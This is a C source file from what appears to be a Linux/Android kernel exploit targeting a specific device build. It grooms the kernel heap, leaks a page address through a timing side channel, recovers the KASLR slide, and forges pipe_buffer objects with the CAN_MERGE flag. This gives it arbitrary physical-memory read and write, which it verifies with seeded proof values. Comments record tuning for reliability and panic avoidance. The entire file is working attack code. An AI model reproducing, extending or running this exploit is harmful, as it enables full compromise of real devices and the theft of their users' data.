#include "common.h"

/* PIPE_SHAPE_ROUNDS removed: was 0, shape code never executed */
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
/* pipe_fds_n/c/e removed: only used by deleted shape_pipe_cache functions */
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
uint64_t pipe_scan_first_ops;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
  if (!ctx->childs || !ctx->memfds) {
    pr_error("init_ctx: calloc OOM cnt=%zu\n", cnt);
    _exit(1);
  }
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  /* Non-fatal: shell often hits EPERM on large F_SETPIPE_SZ; keep default size. */
  if (fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE) < 0) {
    pr_info("resize_pipe_slots slots=%zu errno=%d (continue)\n", slots, errno);
  }
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

/* shape_pipe_cache_once / shape_pipe_cache removed: dead code (rounds=0) */

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  /*
   * PKJ110 16.0.3: objs_per_slab-derived 192/36/5/6 lands pipebuf on
   * kmalloc-cg-2k (gate ok, probe found=1 — run17/18). a.so's fixed
   * 150/24/24/25 lands it on an unrelated kmem_cache (slab=
   * 0xffffff8001cf8a00, gate FAILED — run20/21/28). Keep the derived
   * counts; hard gate + retry handles the residual flakiness.
   */
  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
    return 0;
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  /* shape_pipe_cache() removed: dead code (PIPE_SHAPE_ROUNDS was 0) */

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  /* PIPE_SHAPE_ROUNDS != 0 block removed: was always dead (rounds=0) */
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  /*
   * Compound (order>0) pages: struct page +0x08 holds compound_head
   * (a vmemmap pointer), not slab_cache — the pipe_buffer objects on
   * such pages are still kmalloc-2k. Treat vmemmap-domain reads as
   * "compatible": find_pipe_buffer() is the real verification.
   */
  if ((slab_cache & 0xfffffffe00000000ULL) == 0xfffffffe00000000ULL) {
    return 1;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

/*
 * a.so scans PIPE_SCAN_PAGES=30 chunks (0x7800 bytes) for pipe_buffer
 * objects, not just ORDER3_SIZE. pipebuf_page_base may be the page below
 * the actual pipe_buffer slab; scanning the wider window recovers it.
 * (a.so find_pipe_buffer: cmp x8, #0x1e with 0x400-byte chunks.)
 * NOTE: do NOT scan backward (base - N): base is the KernelSnitch leaked
 * page; pages below it may be unmapped and configfs read panics.
 * Chunk=0x100: configfs read of a slab page triggers HARDENED_USERCOPY
 * when the copy size exceeds the slab object size (run20 panic with
 * 0x400 chunks on a small-object page). 256B is safe for kmalloc-256+
 * objects and still fast enough.
 */
#define PIPE_SCAN_BYTES (PIPE_SCAN_CHUNK * 30) /* 0x7800, matches a.so */
#define PIPE_SCAN_CHUNK_SAFE 0x100

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < PIPE_SCAN_BYTES;
       off += PIPE_SCAN_CHUNK_SAFE) {
    if (kernel_read_data(fd, base + off, slab + off,
                         PIPE_SCAN_CHUNK_SAFE) != PIPE_SCAN_CHUNK_SAFE) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[PIPE_SCAN_BYTES];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_ops = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= PIPE_SCAN_BYTES;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_ops == 0) {
        pipe_scan_first_ops = pb.ops;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    return 1;
  }

  /*
   * Side-channel bridge: if slab was readable but ops match failed because
   * kaslr_done=0 (unslid pipe_buf_ops_addr), recover KIMAGE from the first
   * real pipe_buffer.ops seen (KIMAGE-class pointer). Then caller may retry.
   * Requires arb-R already (read_pipe_slab); does not create arb-R by itself.
   */
  if (!kaslr_done && pipe_scan_first_ops &&
      ((pipe_scan_first_ops >> 48) == 0xffff) &&
      ((pipe_scan_first_ops & 0xfffffff000000000ULL) !=
       0xffffff8000000000ULL)) {
    uint64_t tb = pipe_scan_first_ops - (ANON_PIPE_BUF_OPS - KIMAGE_TEXT_BASE);
    if (apply_kimage_base(tb)) {
      pr_info("pipe KIMAGE from ops leak ops=%016llx base=%016zx slide=%016zx\n",
                 (unsigned long long)pipe_scan_first_ops, kaslr_base,
                 kaslr_slide);
    }
  }

  return 0;
}

/*
 * Timed blocking read: poll() first so a missed forge never hangs the
 * exploit forever (run46: read of slab task page blocked until the 115s
 * timeout killed us). Returns bytes read, or -2 on poll timeout, -1 on
 * poll/read error. A poll timeout means the forged pipe_buffer did NOT
 * land on this pipe's head — caller logs diagnostics and aborts cleanly.
 *
 * run81: poll() reported readable but the blocking read() still hung
 * forever (forged slot != head with stale len). Belt-and-suspenders:
 * a 2s SIGALRM interrupts the read (EINTR) so no pipe op can hang the
 * exploit — poll timeout alone was not enough.
 */
static void pipe_alarm_nop(int sig) {
  (void)sig;
}

static ssize_t pipe_timed_read(int rfd, void *out, size_t len, int timeout_ms) {
  struct pollfd pfd;
  pfd.fd = rfd;
  pfd.events = POLLIN;
  pfd.revents = 0;
  int pr = poll(&pfd, 1, timeout_ms);
  if (pr == 0) {
    return -2;
  }
  if (pr < 0) {
    return -1;
  }
  if (!(pfd.revents & (POLLIN | POLLHUP | POLLERR))) {
    return -2;
  }
  struct sigaction sa_old;
  struct sigaction sa_new;
  memset(&sa_new, 0, sizeof(sa_new));
  sa_new.sa_handler = pipe_alarm_nop;
  sigemptyset(&sa_new.sa_mask);
  sa_new.sa_flags = 0; /* no SA_RESTART: read() gets EINTR */
  sigaction(SIGALRM, &sa_new, &sa_old);
  alarm(2);
  ssize_t n = read(rfd, out, len);
  alarm(0);
  sigaction(SIGALRM, &sa_old, NULL);
  if (n < 0 && errno == EINTR) {
    pr_warning("pipe_timed_read EINTR (alarm) fd=%d len=%zu\n", rfd, len);
    fsync(STDERR_FILENO);
    return -1;
  }
  if (n < 0) {
    return -1;
  }
  return n;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  /*
   * JoinChang/a.so use len+1 so the buffer is not fully consumed after a
   * full-size read. Only when it stays inside the page.
   */
  {
    size_t off = (size_t)(direct_addr & (PAGE_SIZE - 1));
    pb.len = (off + len + 1 <= PAGE_SIZE) ? (uint32_t)(len + 1) : (uint32_t)len;
  }
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* Blocking read (a.so does NOT set O_NONBLOCK here; its pipe_phys_read
   * disasm calls read() directly). O_NONBLOCK made .data-page reads fail
   * on PKJ110 (EAGAIN when pipe state raced). Guarded by poll so a missed
   * forge cannot hang the process (run46: slab task page read blocked).
   * NOTE: kernel_write_data succeeded above; a poll timeout means the
   * forged slot is NOT the head buffer of this pipe (stale/released slot
   * or idx mismatch) — saved.* tells us what the slot really holds. */
  ssize_t got = pipe_timed_read(pipefd[0], out, len, 300);
  if (got == -2) {
    pr_warning("pipe_phys_read TIMEOUT buf=%016llx target=%016llx "
               "off=%zu len=%zu idx=%d pipebuf=%016llx saved={page=%016llx "
               "off=%u len=%u flags=%u}\n",
               (unsigned long long)buf_addr,
               (unsigned long long)direct_addr,
               (size_t)(direct_addr & (PAGE_SIZE - 1)), len,
               pipebuf_pipe_idx, (unsigned long long)pipebuf_page_base,
               (unsigned long long)(uintptr_t)saved.page, saved.offset,
               saved.len, saved.flags);
    fsync(STDERR_FILENO);
    kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
    return 0;
  }
  if (got != (ssize_t)len) {
    pr_warning("pipe_phys_read short got=%zd want=%zu buf=%016llx "
               "target=%016llx errno=%d\n",
               got, len, (unsigned long long)buf_addr,
               (unsigned long long)direct_addr, errno);
    fsync(STDERR_FILENO);
  }
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

/* Drain pipe so a later phys-read is not residual from phys-write. */
static void pipe_drain_bytes(int pipefd[2], size_t nbytes) {
  char buf[256];
  int fl = fcntl(pipefd[0], F_GETFL);
  if (fl >= 0) {
    fcntl(pipefd[0], F_SETFL, fl | O_NONBLOCK);
  }
  while (nbytes > 0) {
    size_t chunk = nbytes > sizeof(buf) ? sizeof(buf) : nbytes;
    ssize_t n = read(pipefd[0], buf, chunk);
    if (n <= 0) {
      break;
    }
    nbytes -= (size_t)n;
  }
  if (fl >= 0) {
    fcntl(pipefd[0], F_SETFL, fl);
  }
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  /*
   * Do NOT fully empty the pipe here: reclaim markers keep the pipe_buffer
   * live (head!=tail). Full drain releases the slot and later forge misses.
   */
  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* CAN_MERGE write merges into the forged buffer (len=0), so it cannot
   * block on a full pipe; still guard with POLLOUT so a broken pipe state
   * (write end closed / forged slot consumed) cannot hang us. */
  struct pollfd wpfd;
  wpfd.fd = pipefd[1];
  wpfd.events = POLLOUT;
  wpfd.revents = 0;
  int wpr = poll(&wpfd, 1, 300);
  if (wpr == 0 || wpr < 0 || !(wpfd.revents & (POLLOUT | POLLERR | POLLHUP))) {
    pr_warning("pipe_phys_write TIMEOUT buf=%016llx target=%016llx len=%zu "
               "poll=%d revents=0x%x\n",
               (unsigned long long)buf_addr,
               (unsigned long long)direct_addr, len, wpr, wpfd.revents);
    fsync(STDERR_FILENO);
    kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
    return 0;
  }
  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  /*
   * NO drain here — and this is the fix for run48 root-stage TIMEOUTs.
   *
   * a.so's pipe_phys_write does NOT drain. Draining empties the pipe:
   * kernel advances tail to head, so poll() sees pipe_empty and later
   * phys-reads block (poll 300ms → TIMEOUT) even though we forge
   * bufs[tail].len back up — poll_pipe keys on head==tail, not the
   * forged len. Keeping the write's bytes in bufs[tail] (len=wrote>0,
   * tail untouched via CAN_MERGE) leaves the pipe readable, and the
   * next phys-read forges the same fixed pipebuf_addr slot again.
   *
   * Residual-data risk (read64 ok=0 value=5f6365737562656e) is gone:
   * every read path re-forges page+len before poll/read, so the
   * leftover bytes are never served.
   */
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  if (for_write) {
    pb.len = 0;
  } else {
    size_t off = (size_t)(direct_addr & (PAGE_SIZE - 1));
    pb.len = (off + len + 1 <= PAGE_SIZE) ? (uint32_t)(len + 1) : (uint32_t)len;
  }
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = pipe_timed_read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out,
                                  len, 300);
    if (got == -2) {
      pr_warning("pipe_phys_read_data TIMEOUT(forge-all) target=%016llx "
                 "len=%zu idx=%d pipebuf=%016llx\n",
                 (unsigned long long)direct_addr, len, pipebuf_pipe_idx,
                 (unsigned long long)pipebuf_page_base);
      fsync(STDERR_FILENO);
      return 0;
    }
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipefd[1], data, len);
    if (wrote == (ssize_t)len && wrote > 0) {
      pipe_drain_bytes(pipefd, (size_t)wrote);
    }
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  /*
   * ASO path: run_main_route_threads() already finished — nothing services
   * pipe_prepare_request. Calling prepare_pipe_buffer_page() directly.
   * (Old wait-for-flag only works while main route loop is still running.)
   */
  if (pipebuf_page_base == 0) {
    pr_info("phys step: prepare_pipe_buffer_page (direct; no route waiter)\n");
    fsync(STDERR_FILENO);
    pipebuf_page_base = prepare_pipe_buffer_page();
    pr_info("phys step: pipebuf_page_base=%016zx\n", pipebuf_page_base);
    fsync(STDERR_FILENO);
    if (!pipebuf_page_base || pipebuf_page_base == (uintptr_t)-1) {
      pr_error("phys step: pipe page prepare failed\n");
      return 0;
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    /*
     * Gate is HARD again (2026-08-11): pipebuf page must sit in a
     * usercopy-marked kmalloc cache (cg-2k etc). When it lands on an
     * unmarked slab (e.g. pipe_inode_info cache, run20/21 slab=
     * 0xffffff8001cf8a00), configfs read of the page panics
     * HARDENED_USERCOPY. Returning 0 here lets try_cfi_stage respray
     * instead of panicking in find_pipe_buffer().
     */
    pr_warning("phys step cache gate FAILED slab=%016zx want=%016zx "
               "(respray; unmarked slab would panic configfs read)\n",
               candidate_slab_cache, kmalloc_pipe_cache);
    fsync(STDERR_FILENO);
    return 0;
  }

  /*
   * Drain each reclaim pipe to empty BEFORE writing markers: residual
   * bytes (from prior attempts/tests) would CAN_MERGE onto the marker,
   * making pb.len != i+1 so find_pipe_buffer() misses (scan=0/0/0).
   * This is a major cause of the flaky pipe-probe failures.
   */
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    pipe_drain_bytes(pipe_fds_reclaim[i], 65536);
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  if (!found) {
    pr_warning("phys pipe probe found=0 pipebuf=%016zx scan=%d/%d/%d "
               "(pipe_buffer not located)\n",
               pipebuf_addr, pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len);
    return 0;
  }
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  /*
   * Order: all reads, then write64, then string write.
   * String CAN_MERGE write used to run before write64 and left pipe state that
   * made the 8-byte write miss the proof page (r64=1 w64=0, after=seed).
   */
  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);
  fsync(STDERR_FILENO);

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    pr_error("phys step seed64 configfs write failed\n");
    return 0;
  }
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  fsync(STDERR_FILENO);

  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;
  pr_info("phys step write64 done ok=%d after=%016zx\n", physrw_write64_ok,
          physrw_read64_after);
  fsync(STDERR_FILENO);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  fsync(STDERR_FILENO);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));
  physrw_write_ok =
    physrw_write_ok &&
    memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_read64_ok && physrw_write64_ok && physrw_write_ok;
}
